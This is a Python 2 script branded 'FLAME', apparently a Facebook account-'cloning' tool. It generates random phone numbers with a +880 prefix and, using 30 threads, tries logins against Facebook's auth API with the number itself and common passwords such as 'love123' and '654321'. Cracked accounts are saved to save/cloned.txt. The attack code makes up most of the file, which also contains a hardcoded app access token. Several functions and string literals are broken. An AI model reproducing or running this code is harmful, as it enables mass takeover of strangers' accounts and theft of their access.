#!/usr/bin/python2
#coding=utf-8
# Python Auto Dis Parser 1.1.0
# Author : BANGLADESH KING| FLAME NAIM
# https://www.facebook.com/Naim.Vau80
# https://www.facebook.com/Naim.Vau80
# ------------------------------------------
# Embedded File   : NAIM
# Modify MMU

#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Awaismomand')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
#br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; U; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36 OPR/61.0.2254.59937')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;96m---------------------🔥 FLAME 🔥---------------------
\033[1;92m →→→→→→→→→          New Version1.0　    ←←←←←←←←←←
\033[1;97m →→→→→→→→→　     Author: B4BY DR4G0N    ←←←←←←←←←←
\033[1;91m →→→→→→→→→   　    Creation: M4RMU      ←←←←←←←←←←
\033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←

\033[1;96m------------------------𝐅𝐋𝐀𝐌𝐄 -----------------------------
"""

####Logo####

logo1 = """
\033[1;93m ███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗  \033[1;91mB
\033[1;93m ████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║  \033[1;91mA
\033[1;92m ██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║  \033[1;91mB
\033[1;92m ██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║  \033[1;91mY
\033[1;91m ██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝  \033[1;92mD R A G O N
\033[1;91m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░  
\033[1;92m →→→→→→→→→          New Version1.0　    ←←←←←←←←←←
\033[1;97m →→→→→→→→→　     Author: B4BY DR4G0N    ←←←←←←←←←←
\033[1;91m →→→→→→→→→   　    Creation: M4RMU      ←←←←←←←←←←
\033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←
\033[1;94m---------------------------------------------------"""

logo2 = """
\033[1;93m ███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗  \033[1;91mB
\033[1;93m ████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║  \033[1;91mA
\033[1;92m ██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║  \033[1;91mB
\033[1;92m ██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║  \033[1;91mY
\033[1;91m ██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝  \033[1;92mD R A G O N
\033[1;91m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░  
\033[1;92m →→→→→→→→→          New Version1.0　    ←←←←←←←←←←
\033[1;97m →→→→→→→→→　     Author: B4BY DR4G0N    ←←←←←←←←←←
\033[1;91m →→→→→→→→→   　    Creation: M4RMU      ←←←←←←←←←←
\033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←
\033[1;94m---------------------------------------------------
\033[1;96m----------------- 𝐅𝐋𝐀𝐌𝐄 -------------------------
\033[1;94m---------------------------------------------------
"""
Username = "Flame"
CorrectPasscode = "Dragon"

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;97mPASSWORD \x1b[1;97m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92mCORRECT
                  """
            loop = 'false'
    else:
            print "\033[1;91mWRONG"
            os.system('xdg-open https://www.facebook.com/Naim.Vau80')

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;93m[1]\x1b[1;94mFLAME 
   Start cloning ( no login )"
    time.sleep(0.05)
    print '\x1b[1;93m[0]\033[1;94m M4RMU
    Exit ( C u soon )'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95m𝐅𝐋𝐀𝐌𝐄 𝐍𝐀𝐈𝐌 CHOOSE: \033[1;95m"
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;94m[1] FLAME NAIM Start Cracking'
    time.sleep(0.05)
    print '\x1b[1;94m[0] \033[1;93mBack'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;95mAWAIX CHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Enter any pakistan code Number"+'\n'
        print 'Enter any code  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,40,41,42,43,44,45,46,47,48,49
        try:
            c = raw_input("\033[1;96mAWAIS CHOOSE : ")
            k="+880"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;91m-'
    xxx = str(len(id))
    jalan ('\033[1;92m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;92mWait 𝐅𝐋𝐀𝐌𝐄 𝐍𝐀𝐈𝐌 Start Cracking...")
    jalan ("\033[1;92mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;91m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(✓)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;93m(✓) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(✓)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;93m(✓) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="love123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(✓)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;93m(✓) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="102030"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(✓)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;93m(✓) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="654321"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(✓)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;93m(✓) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'FLAME NAIM Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 07 to 09 days")
    print ''
    print """
    ______________________
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║ ╔════════════╗ ╚════════════╝
  ║██████████╚╗
  ║██╔══╗█╔═╗█║
  ║██║╬╔╝█╚╗║█║
  ║██╚═╝█║█╚╝█║
  ╚╗█████████═╝
     ╚╗║╠╩╩╩╩╩╝
        ║║┈┈┈█▐█████▒.｡oO
        ║██╠╦╦╦╗
        ╚╗██████
           ╚════╝

\033[1;96mThanks me later
\033[1;92m →→→→→→→→→          New Version1.0　    ←←←←←←←←←←
\033[1;97m →→→→→→→→→　     Author: B4BY DR4G0N    ←←←←←←←←←←
\033[1;91m →→→→→→→→→   　    Creation: M4RMU      ←←←←←←←←←←
\033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←"""

    
    raw_input("\n\033[1;92m[\033[1;92mNAIM Back\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

